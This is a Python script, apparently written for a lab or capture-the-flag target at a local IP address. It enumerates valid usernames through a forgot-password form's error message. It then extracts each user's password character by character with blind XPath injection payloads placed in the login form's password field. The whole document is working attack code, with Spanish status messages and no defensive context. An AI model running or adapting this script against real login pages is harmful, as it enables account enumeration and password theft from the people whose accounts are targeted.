import requests, signal, sys, string
from termcolor import colored

# CTRL+C
def def_handler(sig, frame):
    print(colored("\n\n[!] Saliendo ....\n",'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "http://192.168.1.60:5010/"
forgot_password_url = "http://192.168.1.60:5010/forgot-password"
chars = string.ascii_letters + string.digits + string.punctuation

def load_user_wordlist():
    user_wordlist = []
    with open('users_dictionary.txt', 'r') as file:
        for user in file:
            user_wordlist.append(user.strip())
    return user_wordlist

def get_users():
    user_wordlist = load_user_wordlist()
    valid_users = []
    for user in user_wordlist:
        post_data = {
            "username": f"{user}"
        }

        r = requests.post(forgot_password_url, data=post_data)

        if not "Usuario no encontrado" in r.text:
            valid_users.append(user)

    return valid_users

def get_password_length(user):
    
    for i in range(1, 30):

        post_data = {
            "username": "test",
            "password": f"test' or username='{user}' and string-length(password)='{i}"
        }

        r = requests.post(login_url, data=post_data)

        if not "Invalid credentials" in r.text:
            return i

def get_password(user, password_lenth):
    password = ""
    for i in range(1, password_length + 1):
        for character in chars:
            post_data = {
                "username": "test",
                "password": f"test' or username='{user}' and substring(password,{i},1)='{character}"
            }

            r = requests.post(login_url, data=post_data)

            if not "Invalid credentials" in r.text:
                password += character
                break
    return password


if __name__ == "__main__":

    valid_users = get_users()
    print(colored("\n[*] Usuarios encontrados: " + ", ".join(valid_users) + "\n",'blue'))

    for user in valid_users:
        password_length = get_password_length(user)
        print(colored("[i] La longitud de la contraseña de {} es: {}\n".format(user, password_length),'yellow'))
        password = get_password(user, password_length)
        print(colored("\t[+] Contraseña de {}: {}\n".format(user, password),'green'))